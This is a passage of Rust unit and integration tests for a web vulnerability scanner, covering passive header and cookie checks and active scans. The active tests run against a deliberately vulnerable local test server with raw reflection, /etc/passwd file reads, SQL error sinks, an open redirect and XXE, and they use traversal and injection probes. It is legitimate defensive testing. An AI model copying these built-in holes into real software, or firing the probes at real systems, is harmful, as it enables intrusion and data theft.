        assert!(!has(&passive_check(&entry("/", true, &resp("302 Found", &h, linked))), CH_FRAME));
        assert!(!has(&passive_check(&entry("/", true, &resp("200 OK", CLEAN_HEADERS, linked))), CH_FRAME));
        let mut post = entry("/", true, &resp("200 OK", &h, linked));
        post.req_raw = b"POST / HTTP/1.1\r\nHost: example.com\r\n\r\n".to_vec().into();
        assert!(!has(&passive_check(&post), CH_FRAME));
    }

    #[test]
    fn cookie_flags_are_checked_individually() {
        let body = "<html></html>";
        let mut h = CLEAN_HEADERS.to_vec();
        h.push(("Set-Cookie", "sessionid=0123456789abcdef0123456789abcdef; Path=/"));
        let v = passive_check(&entry("/", true, &resp("200 OK", &h, body)));
        assert!(has(&v, CH_COOKIE_SECURE));
        assert!(has(&v, CH_COOKIE_HTTPONLY));
        assert!(has(&v, CH_COOKIE_SAMESITE));

        // negative: fully flagged non-session cookie
        let mut h2 = CLEAN_HEADERS.to_vec();
        h2.push(("Set-Cookie", "theme=dark; Secure; HttpOnly; SameSite=Lax"));
        let v2 = passive_check(&entry("/", true, &resp("200 OK", &h2, body)));
        assert!(!has(&v2, CH_COOKIE_SECURE));
        assert!(!has(&v2, CH_COOKIE_HTTPONLY));
        assert!(!has(&v2, CH_COOKIE_SAMESITE));
        assert!(!has(&v2, CH_COOKIE_SAMESITE_NONE));
    }

    #[test]
    fn secure_flag_is_only_required_on_https() {
        let mut h = CLEAN_HEADERS.to_vec();
        h.push(("Set-Cookie", "sid=abc; HttpOnly; SameSite=Strict"));
        let v = passive_check(&entry("/", false, &resp("200 OK", &h, "<html></html>")));
        assert!(!has(&v, CH_COOKIE_SECURE));
    }

    #[test]
    fn samesite_none_without_secure_is_reported() {
        let mut h = CLEAN_HEADERS.to_vec();
        h.push(("Set-Cookie", "sid=abc; HttpOnly; SameSite=None"));
        let v = passive_check(&entry("/", true, &resp("200 OK", &h, "<html></html>")));
        assert!(has(&v, CH_COOKIE_SAMESITE_NONE));
    }

    #[test]
    fn cors_wildcard_null_and_reflection_with_credentials() {
        let json = resp("200 OK", &[
            ("Content-Type", "application/json"),
            ("Strict-Transport-Security", "max-age=31536000"),
        ], "{}");
        let wild = entry_origin("/api", true, None, &resp("200 OK", &[
            ("Content-Type", "application/json"),
            ("Access-Control-Allow-Origin", "*"),
        ], "{}"));
        assert!(has(&passive_check(&wild), CH_CORS_WILDCARD));

        let creds = entry_origin("/api", true, Some("https://evil.test"), &resp("200 OK", &[
            ("Content-Type", "application/json"),
            ("Access-Control-Allow-Origin", "https://evil.test"),
            ("Access-Control-Allow-Credentials", "true"),
        ], "{}"));
        assert!(has(&passive_check(&creds), CH_CORS_CREDS));

        let null = entry_origin("/api", true, Some("null"), &resp("200 OK", &[
            ("Content-Type", "application/json"),
            ("Access-Control-Allow-Origin", "null"),
        ], "{}"));
        assert!(has(&passive_check(&null), CH_CORS_NULL));

        // negative: fixed allow-list that does not reflect the caller
        let fixed = entry_origin("/api", true, Some("https://evil.test"), &resp("200 OK", &[
            ("Content-Type", "application/json"),
            ("Access-Control-Allow-Origin", "https://example.com"),
        ], "{}"));
        let v = passive_check(&fixed);
        assert!(!has(&v, CH_CORS_CREDS));
        assert!(!has(&v, CH_CORS_REFLECT));
        assert!(!has(&v, CH_CORS_WILDCARD));
        assert!(!has(&v, CH_CORS_NULL));
        // sanity: the json body itself raises nothing
        assert!(passive_check(&entry("/api", true, &json)).is_empty());
    }

    #[test]
    fn reflected_origin_without_credentials_is_low() {
        let e = entry_origin("/api", true, Some("https://evil.test"), &resp("200 OK", &[
            ("Content-Type", "application/json"),
            ("Access-Control-Allow-Origin", "https://evil.test"),
        ], "{}"));
        assert!(has(&passive_check(&e), CH_CORS_REFLECT));
    }

    #[test]
    fn technology_headers_are_reported() {
        let mut h = CLEAN_HEADERS.to_vec();
        h.push(("Server", "nginx/1.18.0"));
        h.push(("X-Powered-By", "PHP/8.1.2"));
        h.push(("X-AspNet-Version", "4.0.30319"));
        let v = passive_check(&entry("/", true, &resp("200 OK", &h, "<html></html>")));
        assert!(has(&v, CH_SERVER));
        assert!(has(&v, CH_XPB));
        assert!(has(&v, CH_ASPNET));
        let clean_v = passive_check(&entry("/", true, &clean()));
        assert!(!has(&clean_v, CH_SERVER));
        assert!(!has(&clean_v, CH_XPB));
    }

    #[test]
    fn stack_traces_are_disclosed() {
        let body = "<html><pre>Traceback (most recent call last):\n  File \"app.py\"</pre></html>";
        let v = passive_check(&entry("/", true, &resp("200 OK", CLEAN_HEADERS, body)));
        assert!(v.iter().any(|i| i.name == "Python stack trace disclosed in response"));
        assert!(!passive_check(&entry("/", true, &clean()))
            .iter()
            .any(|i| i.name.contains("stack trace")));
    }

    #[test]
    fn directory_listing_is_detected() {
        let body = "<html><head><title>Index of /backup</title></head></html>";
        assert!(has(&passive_check(&entry("/backup/", true, &resp("200 OK", CLEAN_HEADERS, body))), CH_DIR_LISTING));
        assert!(!has(&passive_check(&entry("/", true, &clean())), CH_DIR_LISTING));
    }

    #[test]
    fn git_and_env_files_served_from_the_web_root() {
        let git = resp("200 OK", CLEAN_HEADERS, "[core]\n\trepositoryformatversion = 0\n");
        assert!(has(&passive_check(&entry("/.git/config", true, &git)), CH_GIT));
        assert!(!has(&passive_check(&entry("/config", true, &git)), CH_GIT));

        let env = resp("200 OK", CLEAN_HEADERS, "APP_KEY=base64:abc\nDB_PASSWORD=hunter2\n");
        assert!(has(&passive_check(&entry("/.env", true, &env)), CH_ENV));
        assert!(!has(&passive_check(&entry("/settings", true, &env)), CH_ENV));
    }

    #[test]
    fn login_form_over_http_and_mixed_content() {
        let body = "<html><form action=\"http://example.com/login\"><input type=\"password\" name=\"p\" autocomplete=\"off\"></form></html>";
        let v = passive_check(&entry("/login", false, &resp("200 OK", CLEAN_HEADERS, body)));
        assert!(has(&v, CH_LOGIN_HTTP));

        // negative: HTTPS action, no mixed content
        let ok = "<html><form action=\"https://example.com/login\"><input type=\"password\" name=\"p\" autocomplete=\"off\"></form></html>";
        assert!(!has(&passive_check(&entry("/login", true, &resp("200 OK", CLEAN_HEADERS, ok))), CH_LOGIN_HTTP));

        let mixed = "<html><script src=\"http://cdn.example/x.js\"></script></html>";
        assert!(has(&passive_check(&entry("/", true, &resp("200 OK", CLEAN_HEADERS, mixed))), CH_MIXED));
        let clean_src = "<html><script src=\"https://cdn.example/x.js\"></script></html>";
        assert!(!has(&passive_check(&entry("/", true, &resp("200 OK", CLEAN_HEADERS, clean_src))), CH_MIXED));
    }

    #[test]
    fn password_field_without_autocomplete_off() {
        let body = "<html><form action=\"https://example.com/login\"><input type=\"password\" name=\"p\"></form></html>";
        assert!(has(&passive_check(&entry("/login", true, &resp("200 OK", CLEAN_HEADERS, body))), CH_AUTOCOMPLETE));
        let ok = "<html><form action=\"https://example.com/login\"><input type=\"password\" name=\"p\" autocomplete=\"new-password\"></form></html>";
        assert!(!has(&passive_check(&entry("/login", true, &resp("200 OK", CLEAN_HEADERS, ok))), CH_AUTOCOMPLETE));
    }

    #[test]
    fn cacheable_https_response_needs_a_sensitive_body() {
        let no_cc: Vec<_> = CLEAN_HEADERS.iter().copied().filter(|(k, _)| *k != "Cache-Control").collect();
        let body = "{\"token\":\"secret-value\"}";
        let v = passive_check(&entry("/api", true, &resp("200 OK", &no_cc, body)));
        assert!(has(&v, CH_CACHE));
        // negative: no-store, and a non-sensitive body
        let stored = resp("200 OK", &no_cc, "{\"theme\":\"dark\"}");
        assert!(!has(&passive_check(&entry("/api", true, &stored)), CH_CACHE));
        assert!(!has(&passive_check(&entry("/api", true, &resp("200 OK", CLEAN_HEADERS, body))), CH_CACHE));
    }

    #[test]
    fn cross_host_redirect_carrying_a_session_cookie() {
        let mut h = CLEAN_HEADERS.to_vec();
        h.push(("Location", "https://other.example/next"));
        h.push(("Set-Cookie", "sessionid=0123456789abcdef0123456789abcdef; Secure; HttpOnly; SameSite=Lax"));
        let v = passive_check(&entry("/login", true, &resp("302 Found", &h, "")));
        assert!(has(&v, CH_REDIRECT_COOKIE));

        // negative: same-host redirect
        let mut same = CLEAN_HEADERS.to_vec();
        same.push(("Location", "https://example.com/home"));
        same.push(("Set-Cookie", "sessionid=0123456789abcdef0123456789abcdef; Secure; HttpOnly; SameSite=Lax"));
        assert!(!has(&passive_check(&entry("/login", true, &resp("302 Found", &same, ""))), CH_REDIRECT_COOKIE));
    }

    #[test]
    fn email_private_ip_and_card_numbers_are_disclosed() {
        let body = "<html>Contact admin@example.com from 10.1.2.3, card 4111 1111 1111 1111.</html>";
        let v = passive_check(&entry("/", true, &resp("200 OK", CLEAN_HEADERS, body)));
        assert!(has(&v, CH_EMAIL));
        assert!(has(&v, CH_PRIVATE_IP));
        assert!(has(&v, CH_CREDIT_CARD));
        let clean_v = passive_check(&entry("/", true, &clean()));
        assert!(!has(&clean_v, CH_EMAIL));
        assert!(!has(&clean_v, CH_PRIVATE_IP));
        assert!(!has(&clean_v, CH_CREDIT_CARD));
    }

    #[test]
    fn robots_txt_is_reported() {
        assert!(has(&passive_check(&entry("/robots.txt", true, &resp("200 OK", CLEAN_HEADERS, "Disallow: /admin"))), CH_ROBOTS));
        assert!(!has(&passive_check(&entry("/", true, &clean())), CH_ROBOTS));
    }

    #[test]
    fn binary_bodies_are_ignored_entirely() {
        let mut body = Vec::from(&b"SQL syntax error admin@example.com 10.1.2.3"[..]);
        body.push(0);
        let mut raw = b"HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nStrict-Transport-Security: max-age=31536000\r\n\r\n".to_vec();
        raw.extend_from_slice(&body);
        let mut e = entry("/", true, &clean());
        e.resp_raw = Some(raw.into());
        assert!(passive_check(&e).is_empty());
    }

    #[test]
    fn huge_bodies_are_capped_at_256kb() {
        assert_eq!(MAX_BODY_SCAN, 256 * 1024);
        let mut near = String::from("<html>");
        near.push_str(&"a".repeat(1000));
        near.push_str("SQL syntax");
        near.push_str(&"b".repeat(MAX_BODY_SCAN));
        let v = passive_check(&entry("/", true, &resp("200 OK", CLEAN_HEADERS, &near)));
        assert!(v.iter().any(|i| i.name.contains("SQL error")), "match inside the cap");

        let mut far = String::from("<html>");
        far.push_str(&"a".repeat(MAX_BODY_SCAN + 1024));
        far.push_str("SQL syntax admin@example.com");
        let v2 = passive_check(&entry("/", true, &resp("200 OK", CLEAN_HEADERS, &far)));
        assert!(!v2.iter().any(|i| i.name.contains("SQL error")), "match past the cap");
        assert!(!has(&v2, CH_EMAIL));
    }

    #[test]
    fn passive_issues_are_deduplicated_per_host_and_path() {
        let shared = net::Shared::new();
        // X-Powered-By is a WebProbe extra check (no Burp KB entry).
        shared.extra_checks.store(true, Ordering::SeqCst);
        let mut h = CLEAN_HEADERS.to_vec();
        h.push(("X-Powered-By", "Express"));
        let e = entry("/app", true, &resp("200 OK", &h, "<html></html>"));
        let first = passive_check(&e);
        assert_eq!(first.len(), 1, "only the X-Powered-By issue");
        add_passive_issues(&shared, passive_check(&e));
        add_passive_issues(&shared, passive_check(&e));
        assert_eq!(shared.issues.lock().unwrap().len(), 1);
        // a different path is a different issue
        let other = entry("/other", true, &resp("200 OK", &h, "<html></html>"));
        add_passive_issues(&shared, passive_check(&other));
        assert_eq!(shared.issues.lock().unwrap().len(), 2);
    }

    #[test]
    fn body_and_json_insertion_points() {
        let form = "POST /login?x=1 HTTP/1.1\r\nHost: h\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 13\r\n\r\nuser=a&pw=b%21";
        let pts = insertion_points(form);
        // Parameters first; the body and URL parameter-name points, the
        // synthesised Referer and the URL path filename point follow
        // (burp.Zuq.Zs order).
        let names: Vec<_> = pts.iter().map(|p| (p.name.as_str(), p.value.as_str())).collect();
        assert_eq!(names, vec![("x", "1"), ("user", "a"), ("pw", "b!"), ("", "1"), ("", "1"), ("Referer", SYNTH_REFERER), ("URL path filename", "login")]);
        let r = inject(form, &pts[1], "a%27");
        assert!(r.ends_with("user=a%27&pw=b%21") && r.contains("Content-Length: 17\r\n"), "{r}");
        let json = "POST /rest/user/login HTTP/1.1\r\nHost: h\r\nContent-Type: application/json\r\nContent-Length: 30\r\n\r\n{\"email\":\"a@b.c\",\"n\":{\"k\":5}}";
        let pts: Vec<InsertionPoint> = insertion_points(json).into_iter().filter(|p| matches!(p.kind, IpKind::Json(_))).collect();
        assert_eq!(pts.len(), 2);
        let r = inject_payload(json, &pts[0], "a@b.c'");
        let body = r.split("\r\n\r\n").nth(1).unwrap();
        let v: serde_json::Value = serde_json::from_str(body).unwrap();
        assert_eq!(v["email"], "a@b.c'");
        // A deliberately percent-encoded payload reaches the JSON value as
        // written (second review, finding 17).
        let r = inject_payload(json, &pts[0], "..%2f..%2fetc");
        let v: serde_json::Value = serde_json::from_str(r.split("\r\n\r\n").nth(1).unwrap()).unwrap();
        assert_eq!(v["email"], "..%2f..%2fetc");
        assert_eq!(v["n"]["k"], 5);
        // URL parameter of a POST keeps the body intact.
        let q = inject(form, &insertion_points(form)[0], "2");
        assert!(q.starts_with("POST /login?x=2 HTTP/1.1") && q.ends_with("user=a&pw=b%21"), "{q}");
    }

    #[test]
    fn url_path_insertion_points_follow_burp() {
        let pts = path_insertion_points("/api-docs/swagger-ui-init.js");
        assert_eq!(pts, vec![
            ("URL path folder 1".to_string(), 0, "api-docs".to_string()),
            ("URL path filename".to_string(), 1, "swagger-ui-init.js".to_string()),
        ]);
        assert_eq!(with_path_segment("/api-docs/swagger-ui-init.js", 0, "api-docsxyz"), "/api-docsxyz/swagger-ui-init.js");
        assert_eq!(with_path_segment("/a/b?q=1", 1, "bz"), "/a/bz?q=1");
        assert_eq!(path_insertion_points("/ftp/").len(), 1);
        assert!(path_insertion_points("/").is_empty());
    }

    /// burp.Zuq.Zs order: params (URL, body), cookies, X-* headers,
    /// User-Agent, Referer, URL path folders, URL path filename; skip-listed
    /// cookies never count; one cap of 30 over the accepted points.
    /// End to end on 127.0.0.1: a guestbook whose POST stores the comment and
    /// redirects to the page that renders it (stored XSS through the
    /// redirect retrieval request), and whose redirect body echoes the theme
    /// cookie (reflected XSS on a cookie insertion point, medium per
    /// burp.Zwwb.Zv).
    #[test]
    fn active_scan_finds_stored_xss_and_cookie_xss_on_a_local_server() {
        use std::io::{Read, Write};
        let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        let port = listener.local_addr().unwrap().port();
        let stored = std::sync::Arc::new(std::sync::Mutex::new(String::from("first!")));
        let store = stored.clone();
        std::thread::spawn(move || {
            for stream in listener.incoming() {
                let Ok(mut s) = stream else { continue };
                let _ = s.set_read_timeout(Some(std::time::Duration::from_secs(2)));
                let mut raw = Vec::new();
                let mut buf = [0u8; 8192];
                loop {
                    let n = s.read(&mut buf).unwrap_or(0);
                    raw.extend_from_slice(&buf[..n]);
                    let text = String::from_utf8_lossy(&raw).to_string();
                    let done = text.find("\r\n\r\n").is_some_and(|h| {
                        let cl = text[..h].lines().find_map(|l| l.to_ascii_lowercase().strip_prefix("content-length:").map(|v| v.trim().parse::<usize>().unwrap_or(0))).unwrap_or(0);
                        raw.len() >= h + 4 + cl
                    });
                    if n == 0 || done {
                        break;
                    }
                }
                let text = String::from_utf8_lossy(&raw).to_string();
                let (head, body) = text.split_once("\r\n\r\n").unwrap_or((&text, ""));
                let target = head.split_whitespace().nth(1).unwrap_or("/").to_string();
                let theme = head
                    .lines()
                    .find(|l| l.to_ascii_lowercase().starts_with("cookie:"))
                    .and_then(|l| l.split(';').find_map(|p| p.trim().trim_start_matches("Cookie:").trim().strip_prefix("theme=").map(str::to_string)))
                    .map(|v| String::from_utf8_lossy(&pct_decode(&v)).to_string())
                    .unwrap_or_default();
                let resp = if head.starts_with("POST /comment") {
                    if let Some(v) = body.split('&').find_map(|kv| kv.strip_prefix("c=")) {
                        *store.lock().unwrap() = String::from_utf8_lossy(&pct_decode(&v.replace('+', " "))).to_string();
                    }
                    let b = format!("<p>theme {theme}</p>");
                    format!("HTTP/1.1 303 See Other\r\nLocation: /comments\r\nContent-Type: text/html\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{b}", b.len())
                } else if target == "/comments" {
                    let b = format!("<html><body><p>{}</p></body></html>", store.lock().unwrap());
                    format!("HTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{b}", b.len())
                } else {
                    "HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\nConnection: close\r\n\r\n".to_string()
                };
                let _ = s.write_all(resp.as_bytes());
            }
        });
        let shared = net::Shared::new();
        let req = format!("POST /comment HTTP/1.1\r\nHost: 127.0.0.1:{port}\r\nCookie: theme=light\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: 4\r\n\r\nc=hi");
        let mut e = entry("/comment", false, "");
        e.method = "POST".into();
        e.host = "127.0.0.1".into();
        e.port = port;
        e.req_raw = req.into_bytes().into();
        start_active_scan(shared.clone(), e, &[], &[]);
        let t0 = std::time::Instant::now();
        while shared.scan.is_busy() && t0.elapsed() < std::time::Duration::from_secs(120) {
            std::thread::sleep(std::time::Duration::from_millis(100));
        }
        assert!(!shared.scan.is_busy(), "scan did not finish");
        let issues = shared.issues.lock().unwrap();
        let names: Vec<_> = issues.iter().map(|i| (i.name.clone(), i.sev.clone(), i.detail.chars().take(60).collect::<String>())).collect();
        let stored_xss = issues.iter().find(|i| i.name == "Cross-site scripting (stored)").unwrap_or_else(|| panic!("no stored XSS: {names:?}"));
        assert!(stored_xss.detail.starts_with("The value of the c request parameter:") && stored_xss.detail.contains("GET /comments"), "{}", stored_xss.detail);
        let cookie_xss = issues
            .iter()
            .find(|i| i.name == "Cross-site scripting (reflected)" && i.detail.starts_with("The value of the theme cookie:"))
            .unwrap_or_else(|| panic!("no cookie XSS: {names:?}"));
        assert_eq!(cookie_xss.sev, "medium");
        drop(stored);
    }

    /// A deliberately vulnerable HTTP/1.1 server on 127.0.0.1 (random port)
    /// for the characterisation test: /search reflects `q` raw, reads
    /// /etc/passwd through `file`, raises a MySQL error on an odd number of
    /// quotes in `id` and echoes X-Forwarded-For; /go redirects to `url`
    /// (decoded, CR/LF kept); /transfer accepts any POST; /xml expands an
    /// external entity pointing at /etc/passwd; `sort` lands HTML-escaped in
    /// a script string, `tpl` renders {{a*b}}, /board keeps every `msg` and
    /// shows them on later pages; /item is a numeric SQL sink that is both
    /// error-based and boolean, so the error-based issue must suppress the
    /// boolean one. Every response reflects
    /// Origin with credentials; TRACE echoes the request; OPTIONS allows PUT
    /// and DELETE.
    fn characterisation_server() -> u16 {
        use std::io::{Read, Write};
        let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
        let port = listener.local_addr().unwrap().port();
        let board = std::sync::Arc::new(std::sync::Mutex::new(Vec::<String>::new()));
        std::thread::spawn(move || {
            for stream in listener.incoming() {
                let Ok(mut s) = stream else { continue };
                let board = board.clone();
                std::thread::spawn(move || {
                    let _ = s.set_read_timeout(Some(std::time::Duration::from_secs(2)));
                    let mut raw = Vec::new();
                    let mut buf = [0u8; 8192];
                    loop {
                        let n = s.read(&mut buf).unwrap_or(0);
                        raw.extend_from_slice(&buf[..n]);
                        let text = String::from_utf8_lossy(&raw).to_string();
                        let done = text.find("\r\n\r\n").is_some_and(|h| {
                            let cl = text[..h].lines().find_map(|l| l.to_ascii_lowercase().strip_prefix("content-length:").map(|v| v.trim().parse::<usize>().unwrap_or(0))).unwrap_or(0);
                            raw.len() >= h + 4 + cl
                        });
                        if n == 0 || done {
                            break;
                        }
                    }
                    let text = String::from_utf8_lossy(&raw).to_string();
                    let (head, body) = text.split_once("\r\n\r\n").unwrap_or((&text, ""));
                    let method = head.split_whitespace().next().unwrap_or("").to_string();
                    let target = head.split_whitespace().nth(1).unwrap_or("/").to_string();
                    let header = |name: &str| {
                        head.lines().skip(1).find_map(|l| {
                            let (k, v) = l.split_once(':')?;
                            k.trim().eq_ignore_ascii_case(name).then(|| v.trim().to_string())
                        })
                    };
                    let (path, query) = target.split_once('?').unwrap_or((&target, ""));
                    let param = |name: &str| {
                        query.split('&').find_map(|kv| kv.strip_prefix(&format!("{name}="))).map(|v| String::from_utf8_lossy(&pct_decode(&v.replace('+', " "))).to_string())
                    };
                    let cors = header("Origin").map(|o| format!("Access-Control-Allow-Origin: {o}\r\nAccess-Control-Allow-Credentials: true\r\n")).unwrap_or_default();
                    let ok = |ct: &str, extra: &str, b: &str| format!("HTTP/1.1 200 OK\r\nContent-Type: {ct}\r\n{cors}{extra}Content-Length: {}\r\nConnection: close\r\n\r\n{b}", b.len());
                    let resp = if method == "TRACE" {
                        ok("message/http", "", &format!("{head}\r\n\r\n"))
                    } else if method == "OPTIONS" {
                        ok("text/plain", "Allow: GET, POST, PUT, DELETE, OPTIONS\r\n", "")
                    } else if path == "/search" {
                        let q = param("q").unwrap_or_default();
                        let file = param("file").unwrap_or_default();
                        let file = file.split('\0').next().unwrap_or("").to_string();
                        let id = param("id").unwrap_or_default();
                        let sort = param("sort").unwrap_or_default().replace('"', "&quot;").replace('<', "&lt;");
                        let tpl = param("tpl").unwrap_or_default();
                        // A naive template engine: {{a*b}} renders the product.
                        let tpl = regex::Regex::new(r"\{\{(\d+)\*(\d+)\}\}").unwrap().replace_all(&tpl, |c: &regex::Captures| {
                            (c[1].parse::<u64>().unwrap_or(0) * c[2].parse::<u64>().unwrap_or(0)).to_string()
                        }).replace('<', "&lt;");
                        let mut b = format!("<html><body><h1>Search</h1><p>Results for {q}</p><p>{tpl}</p><script>var sort = \"{sort}\";</script>");
                        if file.ends_with("/etc/passwd") {
                            b.push_str("<pre>root:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1::/:/usr/sbin/nologin\n</pre>");
                        }
                        if id.matches('\'').count() % 2 == 1 {
                            b.push_str("<p>You have an error in your SQL syntax near ''' at line 1</p>");
                        }
                        if let Some(x) = header("X-Forwarded-For") {
                            b.push_str(&format!("<!-- client {x} -->"));
                        }
                        b.push_str("</body></html>");
                        ok("text/html; charset=utf-8", "", &b)
                    } else if path == "/item" {
                        // Numeric SQL sink: an odd number of quotes is a
                        // syntax error; `or A=B` (quotes ignored) is a
                        // boolean condition that selects every row when true.
                        let id = param("id").unwrap_or_default();
                        let b = if id.matches('\'').count() % 2 == 1 {
                            "<html><body><p>You have an error in your SQL syntax near '' at line 1</p></body></html>"
                        } else {
                            let cond = regex::Regex::new(r"or (\d+)=(\d+)").unwrap().captures(&id.replace('\'', "")).map(|c| c[1].parse::<u64>().ok() == c[2].parse::<u64>().ok());
                            match cond {
                                Some(true) => "<html><body><ul><li>apple</li><li>banana</li><li>cherry</li></ul></body></html>",
                                Some(false) => "<html><body><ul></ul></body></html>",
                                None => "<html><body><ul><li>apple</li></ul></body></html>",
                            }
                        };
                        ok("text/html", "", b)
                    } else if path == "/board" {
                        // Every msg is kept and shown on every later /board page.
                        let mut log = board.lock().unwrap();
                        if let Some(m) = param("msg") {
                            log.push(m.replace('<', "&lt;"));
                        }
                        let b = format!("<html><body><ul>{}</ul></body></html>", log.iter().map(|m| format!("<li>{m}</li>")).collect::<String>());
                        ok("text/html", "", &b)
                    } else if path == "/go" {
                        let url = param("url").unwrap_or_default();
                        let b = "<html><body>moved</body></html>";
                        format!("HTTP/1.1 302 Found\r\nLocation: {url}\r\nContent-Type: text/html\r\n{cors}Content-Length: {}\r\nConnection: close\r\n\r\n{b}", b.len())
                    } else if path == "/transfer" {
                        if method == "POST" {
                            ok("text/html", "", "<html><body><p>Transferred</p></body></html>")
                        } else {
                            ok("text/html", "", "<html><body><form method=\"POST\"><input name=\"csrf_token\" value=\"fresh000000\"></form></body></html>")
                        }
                    } else if path == "/xml" && method == "POST" {
                        let b = if body.contains("SYSTEM \"file:///etc/passwd\"") {
                            "<result>root:x:0:0:root:/root:/bin/bash</result>"
                        } else {
                            "<result>ok</result>"
                        };
                        ok("application/xml", "", b)
                    } else {
                        "HTTP/1.1 404 Not Found\r\nContent-Length: 0\r\nConnection: close\r\n\r\n".to_string()
                    };
                    let _ = s.write_all(resp.as_bytes());
                });
            }
        });
        port
    }

    /// Characterisation of the whole active scan: four scans against
    /// [`characterisation_server`], the sorted (name, severity, confidence,
    /// path) list of every issue they raise. The scanner refactor must keep
    /// this list identical.
    #[test]
    fn scan_configuration_switches_checks_and_insertion_types_off() {
        let port = characterisation_server();
        let host = format!("127.0.0.1:{port}");
        let scan = |config: crate::scan_config::ScanConfig| -> Vec<String> {
            let shared = net::Shared::new();
            *shared.scan_config.lock().unwrap() = config;
            let mut e = entry("/item?id=5", false, "");
            e.host = "127.0.0.1".into();
            e.port = port;
            e.req_raw = format!("GET /item?id=5 HTTP/1.1\r\nHost: {host}\r\n\r\n").into_bytes().into();
            start_active_scan(shared.clone(), e, &[], &[]);
            let t0 = std::time::Instant::now();
            while shared.scan.is_busy() && t0.elapsed() < std::time::Duration::from_secs(120) {
                std::thread::sleep(std::time::Duration::from_millis(50));
            }
            assert_eq!(shared.scan.total.load(Ordering::SeqCst), shared.scan.done.load(Ordering::SeqCst), "progress settles at the end");
            let mut names: Vec<String> = shared.issues.lock().unwrap().iter().map(|i| i.name.clone()).collect();
            names.sort();
            names.dedup();
            names
        };
        let all = scan(Default::default());
        assert!(all.iter().any(|n| n == "SQL injection"), "{all:?}");
        // The error-based check off: the boolean check (no longer suppressed)
        // still finds the injection.
        let mut cfg = crate::scan_config::ScanConfig::default();
        cfg.disabled_checks.insert("active.sql-injection-error".into());
        assert!(scan(cfg.clone()).iter().any(|n| n == "SQL injection"));
        // Both SQL checks off: no SQL injection reported.
        cfg.disabled_checks.insert("active.sql-injection-boolean".into());
        assert!(!scan(cfg).iter().any(|n| n == "SQL injection"));
        // URL parameters not attacked: the id parameter is never probed.
        let mut cfg = crate::scan_config::ScanConfig::default();
        cfg.disabled_insertion.insert("url".into());
        assert!(!scan(cfg).iter().any(|n| n == "SQL injection"));
        // Every check id in the catalogue is unique.
        let ids: Vec<&str> = check_catalogue().iter().map(|c| c.0).collect();
        let mut sorted = ids.clone();
        sorted.sort();
        sorted.dedup();
        assert_eq!(sorted.len(), ids.len());
    }

    #[test]
    fn characterisation_active_scan_issue_list() {
        let port = characterisation_server();
        let shared = net::Shared::new();
        // Every check, the WebProbe-only ones included, is characterised.
        shared.extra_checks.store(true, Ordering::SeqCst);
        let host = format!("127.0.0.1:{port}");
        let form = "amount=10&csrf_token=abcdef123456";
        let xml = "<?xml version=\"1.0\"?><user><n>bob</n></user>";
        let scans: Vec<(&str, &str, String)> = vec![
            ("GET", "/search?q=hello&file=about.txt&id=1", format!("GET /search?q=hello&file=about.txt&id=1 HTTP/1.1\r\nHost: {host}\r\nOrigin: http://127.0.0.1:{port}\r\n\r\n")),
            ("GET", "/search?sort=name&tpl=x", format!("GET /search?sort=name&tpl=x HTTP/1.1\r\nHost: {host}\r\n\r\n")),
            ("GET", "/item?id=5", format!("GET /item?id=5 HTTP/1.1\r\nHost: {host}\r\n\r\n")),
            ("GET", "/board?msg=hi", format!("GET /board?msg=hi HTTP/1.1\r\nHost: {host}\r\n\r\n")),
            ("GET", "/go?url=/home", format!("GET /go?url=/home HTTP/1.1\r\nHost: {host}\r\n\r\n")),
            ("POST", "/transfer", format!("POST /transfer HTTP/1.1\r\nHost: {host}\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: {}\r\n\r\n{form}", form.len())),
            ("POST", "/xml", format!("POST /xml HTTP/1.1\r\nHost: {host}\r\nContent-Type: application/xml\r\nContent-Length: {}\r\n\r\n{xml}", xml.len())),
        ];
        for (method, path, req) in scans {
            let mut e = entry(path, false, "");
            e.method = method.into();
            e.host = "127.0.0.1".into();
            e.port = port;
            e.req_raw = req.into_bytes().into();
            start_active_scan(shared.clone(), e, &[], &[]);
            let t0 = std::time::Instant::now();
            while shared.scan.is_busy() && t0.elapsed() < std::time::Duration::from_secs(180) {
                std::thread::sleep(std::time::Duration::from_millis(50));
            }
            assert!(!shared.scan.is_busy(), "scan of {path} did not finish");
        }
        // /item is boolean-injectable on its own, so its single SQL injection
        // row proves the error-based hit suppresses the boolean check.
        let item = |v: &str| format!("GET /item?id={v} HTTP/1.1\r\nHost: {host}\r\n\r\n");
        let item_base = send_one(&shared, false, "127.0.0.1", port, item("5").as_bytes()).unwrap();
        let boolean = run_sql_boolean_check("5", &item_base, ScanSpeed::Normal, crate::variations::Accuracy::from_u8(1), |p| {
            send_one(&shared, false, "127.0.0.1", port, item(&encode_query_payload(p)).as_bytes())
        });
        assert!(boolean.is_some(), "/item must be boolean-injectable for the suppression row to mean anything");
        let mut got: Vec<(String, String, String, String)> =
            shared.issues.lock().unwrap().iter().map(|i| (i.name.clone(), i.sev.clone(), i.confidence.clone(), i.path.clone())).collect();
        got.sort();
        let want: Vec<(String, String, String, String)> = CHARACTERISATION_ISSUES
            .iter()
            .map(|(n, s, c, p)| (n.to_string(), s.to_string(), c.to_string(), p.to_string()))
            .collect();
        assert_eq!(got, want, "\nactual list:\n{}", got.iter().map(|g| format!("        ({:?}, {:?}, {:?}, {:?}),", g.0, g.1, g.2, g.3)).collect::<Vec<_>>().join("\n"));

        // Evidence: every issue carries the exchange(s) that confirmed it,
        // and for an injection that is the probe, not the base request.
        let issues = shared.issues.lock().unwrap();
        for i in issues.iter() {
            assert!(!i.evidence.is_empty(), "no evidence on {} {}", i.name, i.path);
            assert!(i.evidence.iter().all(|e| e.request.len() <= EVIDENCE_MAX_BYTES && e.response.is_some()), "{}", i.name);
        }
        let find = |name: &str, path: &str| issues.iter().find(|i| i.name == name && i.path == path).unwrap_or_else(|| panic!("{name} {path}"));
        let trav = find("File path traversal", "/search");
        assert_eq!(trav.evidence.len(), 2, "probe and negative control");
        assert!(String::from_utf8_lossy(&trav.evidence[1].request).contains("passwdX"));
